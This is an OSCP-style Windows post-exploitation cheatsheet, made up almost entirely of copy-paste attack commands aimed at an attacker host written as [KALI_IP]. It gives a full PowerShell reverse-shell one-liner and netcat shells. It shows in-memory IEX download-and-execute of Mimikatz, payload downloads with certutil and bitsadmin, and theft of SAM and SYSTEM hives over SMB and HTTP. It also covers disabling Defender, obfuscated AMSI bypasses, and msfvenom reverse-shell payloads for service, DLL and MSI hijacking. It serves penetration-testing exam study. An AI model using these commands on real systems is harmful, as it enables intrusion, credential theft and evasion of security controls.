# Windows Commands and Operations - OSCP Cheatsheet

> **Methodology and Cheatsheet Cross-References**:
> - Windows Privilege Escalation: [[04-Windows-PrivEsc|04 - Windows Privilege Escalation]]
> - File Transfer Methodology: [[07-File-Transfer|07 - File Transfer Methodology]]
> - Shells and Payloads: [[08-Shells-Payloads|08 - Shells and Payloads]] | [[🐢 reverse-shells]]
> - Active Directory Methodology: [[05-Active-Directory|05 - Active Directory Methodology]] | [[⚔️ ad-attacks]]

---

## Navigation Triage Matrix

| Operational Goal | Technique / Category | Quick Link |
|---|---|---|
| Enumerate users, groups, privileges, and OS version | System and Identity Enumeration | [[#1. System and Identity Enumeration]] |
| Enumerate processes, services, and file permissions | Process and Service Enumeration | [[#2. Process and Service Enumeration]] |
| Query registry keys and search for stored passwords | Registry and Filesystem Search | [[#3. Registry and Filesystem Search]] |
| Transfer files and tools from Kali to Windows | Inbound File Transfers | [[#4. Inbound File Transfers (Kali to Windows)]] |
| Exfiltrate files and data from Windows to Kali | Outbound File Transfers | [[#5. Outbound File Transfers (Windows to Kali)]] |
| Essential PowerShell commands and execution bypass | PowerShell Administration | [[#6. PowerShell Administration Essentials]] |
| Switch users in Netcat shells and extract credentials | Credential Extraction | [[#7. Credential Extraction and User Switching]] |
| Disable Defender and bypass AMSI in PowerShell | Defender and AMSI Bypass | [[#8. Windows Defender and AMSI Bypass]] |
| Service hijacking, DLL hijacking, and MSI exploits | Privilege Escalation Execution | [[#9. Windows Privilege Escalation Execution]] |
| Cross-compile Windows exploits from Kali Linux | Cross-Compilation Guide | [[#10. Cross-Compilation for Windows from Kali]] |
| Fast copy-paste Windows commands | Quick Reference | [[#11. Quick Reference Cheat Sheet]] |

---

## 1. System and Identity Enumeration

### User Identity and Token Privileges
```cmd
:: Current username
whoami

:: Token privileges (CRITICAL: inspect for SeImpersonate, SeAssignPrimaryToken, SeBackup)
whoami /priv

:: Group memberships (inspect for Administrators, Remote Management Users, Backup Operators)
whoami /groups

:: List all local accounts
net user

:: Detailed information on specific user
net user [USERNAME]

:: List local administrators
net localgroup Administrators
```

### System Environment and Architecture
```cmd
:: Full system info (OS build, architecture, network cards, installed hotfixes)
systeminfo

:: Fast architecture and version extraction
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

:: Machine hostname
hostname
```

### Network Configuration and Connections
```cmd
:: Interface configuration and DNS servers
ipconfig /all

:: Routing table (inspect for dual-homed secondary subnets)
route print

:: Active listening ports and established connections
netstat -ano | findstr LISTENING

:: Neighboring systems in ARP cache
arp -a
```

### WinRM Configuration
```powershell
# Verify if WinRM service is listening locally
winrm enumerate winrm/config/listener
Test-WSMan -ComputerName localhost
```

---

## 2. Process and Service Enumeration

### Process Inspection
```cmd
:: List running processes mapped to service names
tasklist /SVC

:: Query processes with command-line arguments via WMIC
wmic process get caption,commandline,processid
```

### Service Enumeration and Configuration
```cmd
:: List all services with state and binary paths
wmic service get name,displayname,pathname,startmode,state

:: Detailed service query (inspect binPath and start type)
sc qc [ServiceName]

:: Query current service status
sc query [ServiceName]
```

### Service Manipulation
```cmd
:: Create a new service running a custom binary as SYSTEM
sc create [ServiceName] binPath= "C:\Windows\Temp\shell.exe" start= auto

:: Reconfigure an existing service binary path
sc config [ServiceName] binPath= "C:\Windows\Temp\shell.exe"

:: Start and stop services
net start [ServiceName]
net stop [ServiceName]
```

### Installed Software and Applications
```cmd
:: Enumerate MSI-installed products
wmic product get name,version

:: Inspect Program Files directories
dir "C:\Program Files" /b
dir "C:\Program Files (x86)" /b
```

---

## 3. Registry and Filesystem Search

### Registry Password Searches
```cmd
:: Recursive search for plaintext passwords in HKLM
reg query HKLM /f "password" /t REG_SZ /s

:: Recursive search in HKCU
reg query HKCU /f "password" /t REG_SZ /s

:: Check for Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Filesystem Navigation and Keyword Search
```cmd
:: Directory listing including hidden and system files
dir /a

:: Read file content
type C:\Windows\Temp\proof.txt

:: Search configuration and text files for passwords
findstr /si "password" *.txt *.ini *.config *.xml *.json
findstr /si "conn_string" *.config

:: Verify Access Control Lists (ACLs) on file or folder
icacls "C:\Program Files\VulnerableApp"
```
*Permissions to look for*: `(F)` Full Control, `(M)` Modify, `(W)` Write permission for `BUILTIN\Users` or `Everyone`.

---

## 4. Inbound File Transfers (Kali to Windows)

### Method 1: Certutil (Native Windows Utility)
```cmd
certutil -urlcache -split -f http://[KALI_IP]/payload.exe C:\Windows\Temp\payload.exe
```

### Method 2: PowerShell Web Requests
```powershell
# Invoke-WebRequest (iwr alias)
Invoke-WebRequest -Uri "http://[KALI_IP]/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"
iwr "http://[KALI_IP]/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"

# WebClient (Compatible with PowerShell 2.0+)
(New-Object System.Net.WebClient).DownloadFile('http://[KALI_IP]/payload.exe', 'C:\Windows\Temp\payload.exe')

# In-Memory Download and Execution (Bypasses disk write)
IEX(New-Object System.Net.WebClient).DownloadString('http://[KALI_IP]/Invoke-Mimikatz.ps1')
```

### Method 3: SMB Share Transfer (Kali to Windows)
1. On Kali Linux:
   ```bash
   sudo impacket-smbserver share $(pwd) -smb2support
   ```
2. On Windows Target:
   ```cmd
   copy \\[KALI_IP]\share\payload.exe C:\Windows\Temp\payload.exe
   ```

### Method 4: BITSAdmin
```cmd
bitsadmin /transfer job /download /priority normal http://[KALI_IP]/payload.exe C:\Windows\Temp\payload.exe
```

---

## 5. Outbound File Transfers (Windows to Kali)

### Method 1: PowerShell HTTP POST Upload
1. On Kali Linux (start Python upload server):
   ```bash
   python3 -m uploadserver 8000
   ```
2. On Windows Target:
   ```powershell
   Invoke-WebRequest -Uri http://[KALI_IP]:8000/upload -Method POST -InFile C:\Windows\Temp\SAM
   ```

### Method 2: SMB Exfiltration to Kali Share
```cmd
copy C:\Windows\Temp\SAM \\[KALI_IP]\share\SAM
copy C:\Windows\Temp\SYSTEM \\[KALI_IP]\share\SYSTEM
```

### Method 3: Base64 Encoding for Clipboard Exfiltration
```powershell
# Encode file to Base64 string in terminal:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\Temp\secret.txt"))

# On Kali, decode string:
echo "[BASE64_STRING]" | base64 -d > secret.txt
```

---

## 6. PowerShell Administration Essentials

### Execution Policy Bypass
```cmd
:: Spawn PowerShell with bypass flag
powershell -nop -exec bypass

:: Set policy for the active process scope
Set-ExecutionPolicy Bypass -Scope Process -Force
```

### High-Yield PowerShell Cmdlets
```powershell
Get-ChildItem -Path C:\ -Recurse -Filter "*pass*" -ErrorAction SilentlyContinue
Get-Content C:\Windows\System32\drivers\etc\hosts
Get-Process | Where-Object { $_.Path -notlike "C:\Windows*" }
Get-Service | Where-Object { $_.Status -eq "Running" }
Get-LocalUser | Select-Object Name, Enabled, PasswordRequired
Get-LocalGroupMember -Group "Administrators"
Get-AppLockerPolicy -Effective | Format-List
```

### PowerShell Reverse Shell One-Liner
```powershell
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('[KALI_IP]',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 7. Credential Extraction and User Switching

### Non-Interactive User Switching (PowerShell PSCredential)
> ⚠️ **Important Constraint**: The traditional `runas.exe` command prompts interactively on standard input, which causes raw Netcat shells to freeze permanently. Use `PSCredential` to execute binaries as another user non-interactively:

```powershell
# 1. Create secure credentials object:
$pass = ConvertTo-SecureString "[PASSWORD]" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("[USERNAME]", $pass)

# 2. Launch secondary reverse shell under target user context:
Start-Process -FilePath "C:\Windows\Temp\nc.exe" -ArgumentList "[KALI_IP] 4445 -e cmd.exe" -Credential $creds
```
*Catch connection on Kali with a dedicated listener*: `nc -lvnp 4445`

### Dumping SAM and SYSTEM Registry Hives
Requires local administrative privileges or `SeBackupPrivilege`:
```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
```
Exfiltrate hives and parse locally on Kali:
```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Saved Credentials and Autologon
```cmd
:: Inspect Windows Credential Manager
cmdkey /list

:: If saved credentials exist, execute under saved credentials:
runas /savecred /user:[SAVED_USER] "C:\Windows\Temp\shell.exe"
```

### PowerShell History Audit
```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## 8. Windows Defender and AMSI Bypass

### Disabling Windows Defender (Requires Administrative Shell)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
```

### In-Memory AMSI Bypass for Current PowerShell Process
Execute before loading detected offensive PowerShell scripts (winPEAS, PowerUp, Mimikatz):

```powershell
# Method 1: Reflection patch on AmsiUtils
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Obfuscated string manipulation bypass
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZ' + 'x' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f't','i','NonPubli','c','c,S' ) )."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

---

## 9. Windows Privilege Escalation Execution

### Scheduled Task and Binary Replacement
1. Query scheduled tasks:
   ```cmd
   schtasks /query /fo LIST /v
   ```
2. Verify file permissions:
   ```cmd
   icacls "C:\Tasks\backup.exe"
   ```
3. If writable (`M` or `F`), generate replacement payload on Kali and replace:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f exe -o replacement.exe
   ```
   ```cmd
   move C:\Tasks\backup.exe C:\Tasks\backup.exe.bak
   copy \\[KALI_IP]\share\replacement.exe C:\Tasks\backup.exe
   ```

### DLL Hijacking Execution
1. Identify missing DLLs loaded by high-privilege applications using Process Monitor or known paths.
2. Generate malicious DLL on Kali:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f dll -o hijacked.dll
   ```
3. Place payload DLL in application directory and restart service:
   ```cmd
   copy \\[KALI_IP]\share\hijacked.dll "C:\Program Files\App\missing.dll"
   net stop [ServiceName] && net start [ServiceName]
   ```

### AlwaysInstallElevated Execution
1. Verify both registry keys are set to `0x1`:
   ```cmd
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```
2. Generate malicious MSI package on Kali:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f msi -o install.msi
   ```
3. Install package silently on target:
   ```cmd
   msiexec /quiet /qn /i C:\Windows\Temp\install.msi
   ```

### Token Impersonation (SeImpersonatePrivilege)
If `whoami /priv` reveals `SeImpersonatePrivilege` enabled:
```cmd
:: Windows Server 2016 / 2019 / Windows 10
PrintSpoofer.exe -i -c "C:\Windows\Temp\nc.exe [KALI_IP] 443 -e cmd.exe"

:: Windows Server 2019 / 2022 (Modern Potato)
GodPotato.exe -cmd "cmd.exe /c whoami"
```

---

## 10. Cross-Compilation for Windows from Kali

When compiling public C/C++ Windows exploit source codes directly on Kali Linux:

```bash
# 64-bit Windows compilation
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32

# 32-bit Windows compilation
i686-w64-mingw32-gcc exploit.c -o exploit32.exe -m32 -lws2_32 -lntdll
```

---

## 11. Quick Reference Cheat Sheet

```cmd
:: 1. Immediate Privilege Check
whoami /priv

:: 2. System and Network Summary
systeminfo
netstat -ano | findstr LISTENING

:: 3. Fast File Download via Certutil
certutil -urlcache -split -f http://[KALI_IP]/file.exe C:\Windows\Temp\file.exe

:: 4. PowerShell File Download
powershell -c "iwr http://[KALI_IP]/file.exe -OutFile C:\Windows\Temp\file.exe"

:: 5. Save SAM and SYSTEM Registry Hives
reg save HKLM\SAM C:\Windows\Temp\SAM && reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM

:: 6. Check AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: 7. Check File Permissions
icacls "C:\Path\To\Binary.exe"

:: 8. Token Impersonation Execution
PrintSpoofer.exe -i -c cmd.exe
```
